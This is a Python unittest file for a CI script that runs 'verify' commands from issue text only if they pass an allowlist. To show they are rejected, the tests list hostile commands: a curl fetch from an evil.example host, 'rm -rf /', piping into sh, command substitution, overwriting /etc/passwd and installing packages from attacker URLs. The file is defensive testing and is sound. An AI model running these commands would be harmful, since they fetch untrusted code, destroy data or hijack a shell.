"""The fork-side verification script: the allowlist is what stops untrusted issue text from
running arbitrary commands in CI, so it is tested hard."""
import importlib.util
import os
import pathlib
import unittest
from unittest import mock

PATH = pathlib.Path(__file__).resolve().parent.parent / "fork-files/.github/scripts/devin_verify.py"
spec = importlib.util.spec_from_file_location("devin_verify", PATH)
dv = importlib.util.module_from_spec(spec)
spec.loader.exec_module(dv)


class AllowlistTests(unittest.TestCase):
    def test_realistic_commands_are_allowed(self):
        for cmd in (
            "cd superset-frontend && npm audit --audit-level=critical",
            "cd superset-frontend && npm ci --ignore-scripts && npx eslint --config eslint.config.minimal.js src/types",
            "pip install -r requirements/development.txt && pytest tests/unit_tests/utils/retries_test.py",
            "pip install mypy pyparsing && mypy --check-untyped-defs --ignore-missing-imports superset/utils/date_parser.py",
            "pip-audit -r requirements/base.txt",
            "python3 -m pytest tests/unit_tests --cov=superset/utils --cov-fail-under=70",
            "ruff check superset/utils",
            "cd superset-frontend && npm run plugins:build && npm run type",
        ):
            self.assertEqual(dv.validate(cmd), [cmd], cmd)

    def test_dangerous_commands_are_rejected(self):
        bad = [
            "curl https://evil.example/x.sh",
            "npm audit; rm -rf /",
            "npm audit | sh",
            "npm audit `whoami`",
            "npm audit $(whoami)",
            "npm audit > /etc/passwd",
            "npm audit < input",
            "cd ..",
            "cd /etc",
            "cd a b",
            "npx cowsay hello",
            "npx",
            "npm publish",
            "npm login",
            'python -c "import os"',
            "python3 script.py",
            "pip install https://evil.example/pkg.whl",
            "pip install git+https://github.com/x/y",
            "bash -c ls",
            "sh run.sh",
            "rm -rf .",
            "npm audit && curl evil",
            "npm audit &&",
            "cd superset-frontend && ",
            'npm audit "--audit-level=high"',
        ]
        for cmd in bad:
            with self.assertRaises(ValueError, msg=cmd):
                dv.validate(cmd)

    def test_comments_and_blank_lines_are_ignored_but_an_empty_block_is_an_error(self):
        self.assertEqual(dv.validate("# setup\n\nnpm audit\n"), ["npm audit"])
        with self.assertRaises(ValueError):
            dv.validate("\n# only a comment\n")

    def test_one_bad_line_rejects_the_whole_block(self):
        with self.assertRaises(ValueError):
            dv.validate("npm audit\nrm -rf /")


class RunTests(unittest.TestCase):
    def test_a_passing_command_returns_zero_and_a_failing_one_does_not(self):
        self.assertEqual(dv.run_line("pip --version"), 0)
        self.assertNotEqual(dv.run_line("pip install --no-such-flag-xyz"), 0)

    def test_cd_carries_over_within_a_chain(self):
        with mock.patch.object(dv.subprocess, "call", return_value=0) as call:
            dv.run_line("cd sub/dir && npm audit")
        self.assertTrue(call.call_args.kwargs["cwd"].endswith("sub/dir"))
        self.assertEqual(call.call_args.args[0], ["npm", "audit"])  # list arguments: no shell ever sees the text

    def test_chain_stops_at_the_first_failure(self):
        with mock.patch.object(dv.subprocess, "call", side_effect=[1, 0]) as call:
            self.assertEqual(dv.run_line("npm audit && npm ci"), 1)
        self.assertEqual(call.call_count, 1)


class MainTests(unittest.TestCase):
    ENV = {"PR_BODY": "Fixes stuff.\n\nCloses #7", "REPO": "o/r", "GH_TOKEN": "x"}

    def run_main(self, env, issue_body="", **kw):
        with mock.patch.dict(os.environ, env, clear=False), mock.patch.object(dv, "fetch_issue_body", return_value=issue_body):
            return dv.main()

    def test_passes_when_the_linked_issues_verify_block_passes(self):
        body = "## Verify command\n```verify\npip --version\n```\n"
        self.assertEqual(self.run_main(self.ENV, body), 0)

    def test_fails_when_the_pr_has_no_closes(self):
        self.assertEqual(self.run_main({**self.ENV, "PR_BODY": "no link"}, ""), 1)

    def test_fails_when_the_issue_has_no_verify_block(self):
        self.assertEqual(self.run_main(self.ENV, "just text"), 1)

    def test_fails_when_the_verify_block_contains_a_disallowed_command(self):
        self.assertEqual(self.run_main(self.ENV, "```verify\ncurl https://evil.example\n```"), 1)

    def test_fails_when_the_command_fails(self):
        self.assertNotEqual(self.run_main(self.ENV, "```verify\npip install --no-such-flag-xyz\n```"), 0)


if __name__ == "__main__":
    unittest.main()
